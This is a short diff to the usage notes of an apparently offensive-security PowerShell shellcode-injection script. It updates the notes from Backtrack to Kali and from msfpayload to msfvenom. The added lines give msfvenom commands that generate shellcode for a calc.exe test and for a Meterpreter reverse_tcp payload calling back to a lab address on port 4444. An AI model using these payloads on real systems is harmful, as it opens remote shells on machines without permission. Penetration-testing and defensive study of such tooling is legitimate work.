@@ -15,9 +15,10 @@ Optional Dependencies: None
 
 Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre
 
-PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
+PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Kali (Thanks, Matt and g0tm1lk):
 
-msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
+msfvenom --payload windows/x64/exec CMD="calc" EXITFUNC=thread -f c | sed 's/[";]//g;s/\\/,0/g' | tr -d '\n'
+msfvenom --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 EXITFUNC=thread -f c | sed 's/[";]//g;s/\\/,0/g' | tr -d '\n'
 
 Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
  
